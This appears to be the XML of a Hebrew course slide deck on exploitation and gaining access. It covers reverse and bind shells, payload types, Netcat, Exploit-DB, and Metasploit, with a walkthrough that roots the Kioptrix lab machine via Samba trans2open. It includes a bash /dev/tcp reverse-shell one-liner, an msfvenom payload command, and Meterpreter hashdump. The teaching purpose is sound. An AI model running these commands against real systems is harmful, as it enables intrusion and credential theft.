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ניצול והשגת גישה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7 —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Shells: Reverse מול Bind</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Payloads: Staged מול Non-Staged</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Netcat, ניצול ידני, Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>ניצול Kioptrix → root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הניצול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הפעלת Exploit על חולשה → הרצת קוד ביעד</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>התוצאה: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — שליטה בשורת הפקודה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>⚠️ Exploits עלולים להקריס — קח Snapshot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>חולשה (מודול 6) → Exploit → Payload → Shell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מהו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ערוץ להרצת פקודות על מכונה מרוחקת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>השגת Shell = השגת שליטה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>השאלה: מי יוזם את החיבור?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>התשובה → Reverse או Bind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Reverse מול Bind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Reverse</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — הקורבן מתחבר אליך (Listener אצלך)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Bind</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — אתה מתחבר לקורבן (Listener אצלו)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Reverse עוקף Firewall/NAT (תעבורה יוצאת)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>💡 Reverse = הנפוץ ביותר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Payloads: Staged מול Non-Staged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Staged</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) — בשלבים, קטן</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Non-Staged</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>_</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) — מלא, יציב יותר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>.../reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> מול </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>..._reverse_tcp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>נכשל? החלף ביניהם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Netcat — Listener בסיסי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nc -lvnp 4444</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — מאזין</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>revshells.com — לגזירת Reverse Shells</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>“סכין הצבא השווייצרי” של הרשת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ניצול ידני מ-Exploit-DB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searchsploit -m &lt;id&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — העתקה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>קרא את הקוד קודם!</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (הוראות + בטיחות)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>gcc exploit.c -o exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — קומפילציה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>לעיתים צריך להתאים IP/פורט/Offset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Metasploit — זרימת עבודה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 &lt;service&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>use &lt;module&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>show options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>set RHOSTS</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (יעד) · </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>set LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (אתה)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>set PAYLOAD</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>exploit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ניצול Kioptrix →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Samba פגיע (ממודול 6)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>use exploit/linux/samba/trans2open</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>set RHOSTS</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>PAYLOAD</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> 🎯 (צלם מסך = PoC)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msfvenom ו-Meterpreter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msfvenom -p ... LHOST= LPORT= -f exe -o shell.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>קליטה עם </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — Shell משודרג בזיכרון</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>sysinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>hashdump</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>download</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> → מודול 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Reverse/Bind Shells, Staged/Non-Staged Payloads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>Netcat + Metasploit = כלי הניצול</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" algn="r" rtl="1"/>
            <a:r>
              <a:rPr/>
              <a:t>ניצלנו Kioptrix והשגנו root מקצה לקצה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2026-09-29T11:20:45Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-29T11:20:45Z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